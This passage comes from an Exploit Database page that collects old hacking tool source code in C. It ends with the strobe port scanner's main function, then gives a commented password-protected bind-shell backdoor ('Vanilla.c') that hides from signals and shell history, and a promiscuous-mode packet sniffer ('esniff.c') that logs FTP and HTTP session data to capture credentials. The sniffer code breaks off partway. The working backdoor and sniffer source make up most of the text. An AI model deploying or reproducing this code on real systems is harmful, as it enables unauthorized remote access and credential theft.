	    } 
	    pd-&gt;next = NULL;
	    pd-&gt;name = (char *) (pd) + sizeof (*pd);
	    pd-&gt;portname = pd-&gt;name + strlen(desc)+1;
	    strcpy (pd-&gt;name, desc);
	    strcpy (pd-&gt;portname, portname);
	} else
	    port_descs[port] = (struct port_desc_s *)-1;
    }
    if (f_minimise) 
        free (port_descs);
}

fvoid
usage ()
{
    fprintf (stderr, &quot;\
usage: %8s [options]\n\
\t\t[-v(erbose)]\n\
\t\t[-V(erbose_stats]\n\
\t\t[-m(inimise)]\n\
\t\t[-d(elete_dupes)]\n\
\t\t[-g(etpeername_disable)]\n\
\t\t[-s(tatistics)]\n\
\t\t[-q(uiet)]\n\
\t\t[-o output_file]\n\
\t\t[-b begin_port_n]\n\
\t\t[-e end_port_n]\n\
\t\t[-p single_port_n]\n\
\t\t[-P bind_port_n]\n\
\t\t[-A bind_addr_n]\n\
\t\t[-t timeout_n]\n\
\t\t[-n num_sockets_n]\n\
\t\t[-S services_file]\n\
\t\t[-i hosts_input_file]\n\
\t\t[-l(inear)]\n\
\t\t[-f(ast)]\n\
\t\t[-a abort_after_port_n]\n\
\t\t[-M(ail_author)]\n\
\t\t[host1 [...host_n]]\n&quot;, Argv[0]);
    exit (1);
}
int
main (argc, argv)
  int argc;
  char **argv;
{
    int c;
    Argc = argc;
    Argv = argv;

    while ((c = getopt (argc, argv, &quot;o:dvVmgb:e:p:P:a:A:t:n:S:i:lfsqM&quot;)) != -1)
	switch (c)
	{
	case &#039;o&#039;:
	    a_output = optarg;
	    break;
	case &#039;d&#039;:
	    f_delete_dupes=1;
	    break;
	case &#039;v&#039;:
	    f_verbose = 1;
	    break;
	case &#039;V&#039;:
	    f_verbose_stats = 1;
	    break;
	case &#039;m&#039;:
	    f_minimise = 1;
	    break;
	case &#039;g&#039;:
	    f_dontgetpeername = 1;
	    break;
	case &#039;b&#039;:
	    a_start = atoi (optarg);
	    break;
	case &#039;e&#039;:
	    a_end = atoi (optarg);
	    break;
	case &#039;P&#039;:
	    a_bindport = htons (atoi (optarg));
	    break;
	case &#039;A&#039;:
	    a_bindaddr = optarg;
	    bindaddr = resolve (a_bindaddr);
	    if (bindaddr.s_addr == INADDR_NONE)
	    {
	    	perror(a_bindaddr);
		exit(1);
	    }
            break;
	case &#039;p&#039;:
	    a_start = a_end = atoi (optarg);
	    break;
	case &#039;a&#039;:
	    a_abort = atoi (optarg);
	    break;
	case &#039;t&#039;:
	    a_timeout = atoi (optarg);
	    break;
	case &#039;n&#039;:
	    a_sock_max = atoi (optarg);
	    break;
	case &#039;S&#039;:
	    a_services = optarg;
	    break;
	case &#039;i&#039;:
	    a_input = optarg;
	    break;
	case &#039;l&#039;:
	    f_linear = 1;
	    break;
	case &#039;f&#039;:
	    f_fast = 1;
	    break;
	case &#039;s&#039;:
	    f_stats = 1;
	    break;
        case &#039;q&#039;:
	    f_quiet = 1;
	    break;
	case &#039;M&#039;:
	    fprintf(stderr, &quot;Enter mail to author below. End with ^D or .\n&quot;);
	    system(&quot;mail strobe@suburbia.net&quot;);
	    break;
	case &#039;?&#039;:
	default:
	    fprintf (stderr, &quot;unknown option %s\n&quot;, argv[optind-1]);
	    usage ();
	    /* NOT_REACHED */
	}
    host_n = optind;

    if (!f_quiet)
        fprintf (stderr, &quot;strobe %s (c) 1995 Julian Assange (proff@suburbia.net).\n&quot;, VERSION);
    if (a_input)
    {
        if ( ! strcmp(&quot;-&quot;,a_input) ) { /* Use stdin as input file */
	    fh_input = stdin;
	  }
	else {
	  if (!(fh_input = fopen (a_input, &quot;r&quot;)))
	    {
	      perror (a_input);
	      exit (1);
	    }
	}
    } else
    {
      switch ( argc - host_n ) { /* Number of hosts found on command line */
      case 0:
	fh_input = stdin;
	a_input = &quot;stdin&quot;; /* Needed in &quot;next_host()&quot; */
	break;
      case 1:
	f_linear = 1;
	break;
      }
    }

    if ((fh_input==stdin) &amp;&amp; !f_quiet)
      fprintf (stderr, &quot;Reading host names from stdin...\n&quot;);

    if (a_output)
    {
        int fd;
        if ((fd=open(a_output, O_WRONLY|O_CREAT|O_TRUNC, 0666))==-1)
	{
		perror(a_output);
		exit(1);
	}
	dup2(fd, 1);
    }
    attempt = (struct htuple_s *) Smalloc (a_sock_max * sizeof (struct htuple_s));
    attempt_init();
    if (!f_linear)
    {
    	hosts = (struct hosts_s *) Smalloc (a_sock_max * sizeof (struct hosts_s));
    	hosts_init();
    }
    if (!f_minimise || f_fast)
    	loaddescs ();
    fdsets_init();
    gettimeofday(&amp;time_start, NULL);
    f_linear ? scan_ports_linear ():
 	       scan_ports_paralell ();
    if (f_stats || f_verbose_stats)
	final_stats();
    exit (0);
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Vanilla.c]
/* Vanilla shell daemon with passwort authentification
 * verbose explanation / sample of a shell daemon
 * members.xoom.com/i0wnu (c) 1999 by Mixter */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;signal.h&gt;
int
main (int a, char **b)
{
  int c, d, e = sizeof (struct sockaddr_in), f;
// c will be our listening socket, d our new socket
  char p[20];
  struct sockaddr_in l, r;
  l.sin_family = AF_INET;	// we fill this with our local ip/port

  l.sin_port = htons (5);	// listen to port 5

  l.sin_addr.s_addr = INADDR_ANY;	// our IP (filled in by kernel)

  bzero (&amp;(l.sin_zero), 8);
  c = socket (AF_INET, SOCK_STREAM, 0);		// listening socket

  signal (SIGCHLD, SIG_IGN);	// ignore signals, optional

  signal (SIGHUP, SIG_IGN);
  signal (SIGTERM, SIG_IGN);
  signal (SIGINT, SIG_IGN);
  bind (c, (struct sockaddr *) &amp;l, sizeof (struct sockaddr));	// bind to port

  listen (c, 3);		// listen to port, maximum 3 active connections

  while ((d = accept (c, (struct sockaddr *) &amp;r, &amp;e)))
    // accept blocks and waits for a connection attempt
    // then assigns the client connection to socket d
    {
      if (!fork ())
	// if fork is 0, this is the child process and we
	// will process the clients input
	{
	  recv (d, p, 19, 0);	// wait for up to 19 chars from the client
	  // assign them to p (password variable)

	  for (f = 0; f &lt; strlen (p); f++)	// this replaces trailing garbage

	    {
	      if (p[f] == &#039;\n&#039; || p[f] == &#039;\r&#039;)
		p[f] = &#039;\0&#039;;
	    }
	  if (strcmp (p, &quot;test&quot;) != 0)	// if password isnt &quot;test&quot;

	    {
	      send (d, &quot;\377\373\001&quot;, 4, 0);	// send an evil telnet cmd :)

	      close (d);	// wrong password - bye

	      exit (1);
	    }
	  close (0);		// we close the old stdin/out/err copied

	  close (1);		// by the fork() and create new ones

	  close (2);
	  dup2 (d, 0);		// these give us the new descriptors

	  dup2 (d, 1);		// we need them for user interaction

	  dup2 (d, 2);
	  setenv (&quot;PATH&quot;, &quot;/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.&quot;, 1);
	  unsetenv (&quot;HISTFILE&quot;);
	  execlp (&quot;w&quot;, &quot;w&quot;, (char *) 0);
	  // set some environment stuff, display logged in users, optional
	  execlp (&quot;sh&quot;, &quot;sh&quot;, (char *) 0);	// execute the shell

	  close (d);
	  exit (0);
	}			// end of if(!fork()) loop (child process specific code)

    }				// end of while() loop

  return (0);
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[esniff.c]


/* Esniff.c */

#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;
#include &lt;string.h&gt;

#include &lt;sys/time.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/stropts.h&gt;
#include &lt;sys/signal.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/ioctl.h&gt;

#include &lt;net/if.h&gt;
#include &lt;net/nit_if.h&gt;
#include &lt;net/nit_buf.h&gt;
#include &lt;net/if_arp.h&gt;

#include &lt;netinet/in.h&gt;
#include &lt;netinet/if_ether.h&gt;
#include &lt;netinet/in_systm.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/udp.h&gt;
#include &lt;netinet/ip_var.h&gt;
#include &lt;netinet/udp_var.h&gt;
#include &lt;netinet/in_systm.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;netinet/ip_icmp.h&gt;

#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;

#define ERR stderr

char    *malloc();
char    *device,
        *ProgName,
        *LogName;
FILE    *LOG;
int     debug=0;

#define NIT_DEV     &quot;/dev/nit&quot;
#define CHUNKSIZE   4096        /* device buffer size */
int     if_fd = -1;
int     Packet[CHUNKSIZE+32];

void Pexit(err,msg)
int err; char *msg;
{ perror(msg);
  exit(err); }

void Zexit(err,msg)
int err; char *msg;
{ fprintf(ERR,msg);
  exit(err); }

#define IP          ((struct ip *)Packet)
#define IP_OFFSET   (0x1FFF)
#define SZETH       (sizeof(struct ether_header))
#define IPLEN       (ntohs(ip-&gt;ip_len))
#define IPHLEN      (ip-&gt;ip_hl)
#define TCPOFF      (tcph-&gt;th_off)
#define IPS         (ip-&gt;ip_src)
#define IPD         (ip-&gt;ip_dst)
#define TCPS        (tcph-&gt;th_sport)
#define TCPD        (tcph-&gt;th_dport)
#define IPeq(s,t)   ((s).s_addr == (t).s_addr)

#define TCPFL(FLAGS) (tcph-&gt;th_flags &amp; (FLAGS))

#define MAXBUFLEN  (128)
time_t  LastTIME = 0;

struct CREC {
     struct CREC *Next,
                 *Last;
     time_t  Time;              /* start time */
     struct in_addr SRCip,
                    DSTip;
     u_int   SRCport,           /* src/dst ports */
             DSTport;
     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
     u_int   Length;            /* current data length */
     u_int   PKcnt;             /* # pkts */
     u_long  LASTseq;
};

struct CREC *CLroot = NULL;

char *Symaddr(ip)
register struct in_addr ip;
{ register struct hostent *he =
      gethostbyaddr((char *)&amp;ip.s_addr, sizeof(struct in_addr),AF_INET);

  return( (he)?(he-&gt;h_name):(inet_ntoa(ip)) );
}

char *TCPflags(flgs)
register u_char flgs;
{ static char iobuf[8];
#define SFL(P,THF,C) iobuf[P]=((flgs &amp; THF)?C:&#039;-&#039;)

  SFL(0,TH_FIN, &#039;F&#039;);
  SFL(1,TH_SYN, &#039;S&#039;);
  SFL(2,TH_RST, &#039;R&#039;);
  SFL(3,TH_PUSH,&#039;P&#039;);
  SFL(4,TH_ACK, &#039;A&#039;);
  SFL(5,TH_URG, &#039;U&#039;);
  iobuf[6]=0;
  return(iobuf);
}

char *SERVp(port)
register u_int port;
{ static char buf[10];
  register char *p;

   switch(port) {
     case IPPORT_HTTP:         p=&quot;http&quot;; break;
     case IPPORT_FTP:         p=&quot;ftp&quot;; break;
     default: sprintf(buf,&quot;%u&quot;,port); p=buf; break;
   }
   return(p);
}

char *Ptm(t)
register time_t *t;
{ register char *p = ctime(t);
  p[strlen(p)-6]=0; /* strip &quot; YYYY\n&quot; */
  return(p);
}

char *NOWtm()
{ time_t tm;
  time(&amp;tm);
  return( Ptm(&amp;tm) );
}

#define MAX(a,b) (((a)&gt;(b))?(a):(b))
#define MIN(a,b) (((a)&lt;(b))?(a):(b))

/* add an item */
#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
  register struct CREC *CLtmp = \
        (struct CREC *)malloc(sizeof(struct CREC)); \
  time( &amp;(CLtmp-&gt;Time) ); \
  CLtmp-&gt;SRCip.s_addr = SIP.s_addr; \
  CLtmp-&gt;DSTip.s_addr = DIP.s_addr; \
  CLtmp-&gt;SRCport = SPORT; \
  CLtmp-&gt;DSTport = DPORT; \
  CLtmp-&gt;Length = MIN(LEN,MAXBUFLEN); \
  bcopy( (u_char *)DATA, (u_char *)CLtmp-&gt;Data, CLtmp-&gt;Length); \
  CLtmp-&gt;PKcnt = 1; \
  CLtmp-&gt;Next = CLroot; \
  CLtmp-&gt;Last = NULL; \
  CLroot = CLtmp; \
}

register struct CREC *GET_NODE(Sip,SP,Dip,DP)
register struct in_addr Sip,Dip;
register u_int SP,DP;
{ register struct CREC *CLr = CLroot;

  while(CLr != NULL) {
    if( (CLr-&gt;SRCport == SP) &amp;&amp; (CLr-&gt;DSTport == DP) &amp;&amp;
        IPeq(CLr-&gt;SRCip,Sip) &amp;&amp; IPeq(CLr-&gt;DSTip,Dip) )
            break;
    CLr = CLr-&gt;Next;
  }
  return(CLr);
}

#define ADDDATA_NODE(CL,DATA,LEN) { \
 bcopy((u_char *)DATA, (u_char *)&amp;CL-&gt;Data[CL-&gt;Length],LEN); \
 CL-&gt;Length += LEN; \
}

#define PR_DATA(dp,ln) {    \
  register u_char lastc=0; \
  while(ln-- &gt;0) { \
     if(*dp &lt; 32) {  \
        switch(*dp) { \
            case &#039;\0&#039;: if((lastc==&#039;\r&#039;) || (lastc==&#039;\n&#039;) || lastc==&#039;\0&#039;) \
                        break; \
            case &#039;\r&#039;: \
            case &#039;\n&#039;: fprintf(LOG,&quot;\n     : &quot;); \
                        break; \
            default  : fprintf(LOG,&quot;^%c&quot;, (*dp + 64)); \
                        break; \
        } \
     } else { \
        if(isprint(*dp)) fputc(*dp,LOG); \
        else fprintf(LOG,&quot;(%d)&quot;,*dp); \
     } \
     lastc = *dp++; \
  } \
  fflush(LOG); \
}

void END_NODE(CLe,d,dl,msg)
register struct CREC *CLe;
register u_char *d;
register int dl;
register char *msg;
{
   fprintf(LOG,&quot;\n-- TCP/IP LOG -- TM: %s --\n&quot;, Ptm(&amp;CLe-&gt;Time));
   fprintf(LOG,&quot; PATH: %s(%s) =&gt;&quot;, Symaddr(CLe-&gt;SRCip),SERVp(CLe-&gt;SRCport));
   fprintf(LOG,&quot; %s(%s)\n&quot;, Symaddr(CLe-&gt;DSTip),SERVp(CLe-&gt;DSTport));
   fprintf(LOG,&quot; STAT: %s, %d pkts, %d bytes [%s]\n&quot;,
                        NOWtm(),CLe-&gt;PKcnt,(CLe-&gt;Length+dl),msg);
   fprintf(LOG,&quot; DATA: &quot;);
    { register u_int i = CLe-&gt;Length;
      register u_char *p = CLe-&gt;Data;
      PR_DATA(p,i);
      PR_DATA(d,dl);
    }

   fprintf(LOG,&quot;\n-- \n&quot;);
   fflush(LOG);

   if(CLe-&gt;Next != NULL)
    CLe-&gt;Next-&gt;Last = CLe-&gt;Last;
   if(CLe-&gt;Last != NULL)
    CLe-&gt;Last-&gt;Next = CLe-&gt;Next;
   else
    CLroot = CLe-&gt;Next;
   free(CLe);
}

/* 30 mins (x 60 seconds) */
#define IDLE_TIMEOUT 1800
#define IDLE_NODE() { \
  time_t tm; \
  time(&amp;tm); \
  if(LastTIME&lt;tm) { \
     register struct CREC *CLe,*CLt = CLroot; \
     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
     while(CLe=CLt) { \
       CLt=CLe-&gt;Next; \
       if(CLe-&gt;Time &lt;tm) \
           END_NODE(CLe,(u_char *)NULL,0,&quot;IDLE TIMEOUT&quot;); \
     } \
  } \
}

void filter(cp, pktlen)
register char *cp;
register u_int pktlen;
{
 register struct ip     *ip;
 register struct tcphdr *tcph;

 { register u_short EtherType=ntohs(((struct ether_header *)cp)-&gt;ether_type);

   if(EtherType &lt; 0x600) {
     EtherType = *(u_short *)(cp + SZETH + 6);
     cp+=8; pktlen-=8;
   }

   if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
      return;
 }

    /* ugh, gotta do an alignment :-( */
 bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));

 ip = (struct ip *)Packet;
 if( ip-&gt;ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
    return;
 tcph = (struct tcphdr *)(Packet + IPHLEN);

 if(!( 
       (TCPD == IPPORT_FTP) ||
       (TCPD == IPPORT_HTTP) 
   )) return;

 { register struct CREC *CLm;
   register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
   register u_char *p = (u_char *)Packet;

   p += ((IPHLEN * 4) + (TCPOFF * 4));

 if(debug) {
  fprintf(LOG,&quot;PKT: (%s %04X) &quot;, TCPflags(tcph-&gt;th_flags),length);
  fprintf(LOG,&quot;%s[%s] =&gt; &quot;, inet_ntoa(IPS),SERVp(TCPS));
  fprintf(LOG,&quot;%s[%s]\n&quot;, inet_ntoa(IPD),SERVp(TCPD));
 }

   if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {

      CLm-&gt;PKcnt++;

      if(length&gt;0)
        if( (CLm-&gt;Length + length) &lt; MAXBUFLEN ) {
          ADDDATA_NODE( CLm, p,length);
        } else {
          END_NODE( CLm, p,length, &quot;DATA LIMIT&quot;);
        }

      if(TCPFL(TH_FIN|TH_RST)) {
          END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?&quot;TH_FIN&quot;:&quot;TH_RST&quot; );
      }

   } else {

      if(TCPFL(TH_SYN)) {
         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
      }

   }

   IDLE_NODE();

 }

}

/* signal handler
 */
void death()
{ register struct CREC *CLe;

    while(CLe=CLroot)
        END_NODE( CLe, (u_char *)NULL,0, &quot;SIGNAL&quot;);

    fprintf(LOG,&quot;\nLog ended at =&gt; %s\n&quot;,NOWtm());
    fflush(LOG);
    if(LOG != stdout)
        fclose(LOG);
    exit(1);
}

/* opens network interface, performs ioctls and reads from it,
 * passing data to filter function
 */
void do_it()
{
    int cc;
    char *buf;
    u_short sp_ts_len;

    if(!(buf=malloc(CHUNKSIZE)))
        Pexit(1,&quot;Eth: malloc&quot;);

/* this /dev/nit initialization code pinched from etherfind */
  {
    struct strioctl si;
    struct ifreq    ifr;
    struct timeval  timeout;
    u_int  chunksize = CHUNKSIZE;
    u_long if_flags  = NI_PROMISC;

    if((if_fd = open(NIT_DEV, O_RDONLY)) &lt; 0)
        Pexit(1,&quot;Eth: nit open&quot;);

    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) &lt; 0)
        Pexit(1,&quot;Eth: ioctl (I_SRDOPT)&quot;);

    si.ic_timout = INFTIM;

    if(ioctl(if_fd, I_PUSH, &quot;nbuf&quot;) &lt; 0)
        Pexit(1,&quot;Eth: ioctl (I_PUSH \&quot;nbuf\&quot;)&quot;);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    si.ic_cmd = NIOCSTIME;
    si.ic_len = sizeof(timeout);
    si.ic_dp  = (char *)&amp;timeout;
    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCSTIME)&quot;);

    si.ic_cmd = NIOCSCHUNK;
    si.ic_len = sizeof(chunksize);
    si.ic_dp  = (char *)&amp;chunksize;
    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCSCHUNK)&quot;);

    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = &#039;\0&#039;;
    si.ic_cmd = NIOCBIND;
    si.ic_len = sizeof(ifr);
    si.ic_dp  = (char *)
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/35952" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/36069" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
